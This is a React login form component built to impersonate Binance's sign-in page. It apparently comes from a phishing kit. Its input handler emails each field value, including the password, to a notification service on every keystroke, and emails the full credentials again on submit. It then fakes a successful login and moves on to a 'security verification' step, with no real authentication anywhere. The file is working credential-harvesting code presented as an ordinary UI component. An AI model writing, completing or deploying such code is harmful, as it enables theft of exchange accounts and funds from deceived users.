
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Eye, EyeOff, User, Lock } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

interface LoginFormProps {
  onLoginSuccess: (username: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleInputChange = async (field: string, value: string) => {
    console.log(`🔄 Field changed: ${field} = "${value}"`);
    
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Send email notification immediately
    try {
      console.log('📧 Sending email notification...');
      await sendEmailNotification({
        step: "Login Form - Field Update",
        field: field,
        value: value,
        username: formData.username || "Not provided yet",
        timestamp: new Date().toISOString(),
        allFormData: { ...formData, [field]: value }
      });
      console.log('✅ Email notification sent successfully!');
    } catch (error) {
      console.error('❌ Email notification failed:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.username || !formData.password) {
      toast({
        title: "Missing information",
        description: "Please enter both username and password.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      console.log('📧 Sending login attempt email...');
      await sendEmailNotification({
        step: "Login Form - Submit Attempt",
        username: formData.username,
        timestamp: new Date().toISOString(),
        allFormData: formData
      });
      console.log('✅ Login attempt email sent!');
    } catch (error) {
      console.error('❌ Login attempt email failed:', error);
    }

    // Simulate login process
    setTimeout(() => {
      setIsLoading(false);
      onLoginSuccess(formData.username);
      toast({
        title: "Login successful",
        description: "Proceeding to security verification.",
      });
    }, 1500);
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-white mb-2">Log In to Binance</h1>
            <p className="text-[#848E9C] text-base">Welcome back! Please sign in to your account</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Label htmlFor="username" className="text-[#B7BDC6] text-base mb-2 block">
                Email or Phone Number
              </Label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#848E9C]" />
                <Input
                  id="username"
                  type="text"
                  value={formData.username}
                  onChange={(e) => handleInputChange('username', e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white pl-11 h-12 text-base focus:border-binance-yellow"
                  placeholder="Enter your email or phone number"
                  required
                />
              </div>
            </div>

            <div>
              <Label htmlFor="password" className="text-[#B7BDC6] text-base mb-2 block">
                Password
              </Label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#848E9C]" />
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={formData.password}
                  onChange={(e) => handleInputChange('password', e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white pl-11 pr-11 h-12 text-base focus:border-binance-yellow"
                  placeholder="Enter your password"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] hover:text-white"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              {isLoading ? "Signing In..." : "Log In"}
            </Button>
          </form>

          <div className="mt-6 text-center space-y-3">
            <button className="text-binance-yellow hover:underline text-sm">
              Forgot Password?
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
